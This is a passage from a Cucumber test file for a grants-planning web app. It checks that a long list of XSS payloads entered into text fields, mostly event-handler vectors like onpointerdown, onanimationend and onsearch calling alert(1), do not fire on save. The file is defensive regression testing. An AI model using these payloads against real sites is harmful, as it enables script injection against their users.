      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304248 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                          | Field                          |
      | <a onpaste="alert(1)" contenteditable>test</a> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304249 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                            | Field                          |
      | <audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304251 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                     | Field                          |
      | <xss onpointerdown=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304253 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                      | Field                          |
      | <xss onpointerenter=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304255 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                      | Field                          |
      | <xss onpointerleave=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304257 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                     | Field                          |
      | <xss onpointermove=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304261 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                    | Field                          |
      | <xss onpointerout=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304318 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                     | Field                          |
      | <xss onpointerover=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304322 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                          | Field                          |
      | <xss onpointerrawupdate=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304323 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                   | Field                          |
      | <xss onpointerup=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304327 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                 | Field                          |
      | <audio controls autoplay onratechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304329 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    And I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                     | Field                          |
      | <form onreset=alert(1)><input type=reset> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304356 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                    | Field                          |
      | <form><input type=search onsearch=alert(1) value="Hit return" autofocus> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

################## Data Type - Text Area - Dilip ###################

###################################################################################################################################

  @300166 @dilip
  Scenario Outline:(Admin) To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value           | Field                  |
      | Assistance Type | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box

    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301804 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                 | Field                  |
      | <xss onafterscriptexecute=alert(1)><script>1</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301805 @dilip
  Scenario Outline:Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                                                                           | Field                  |
      | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301809 @dilip
  Scenario Outline:Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                       | Field                  |
      | <style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301810 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                                                            | Field                  |
      | <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
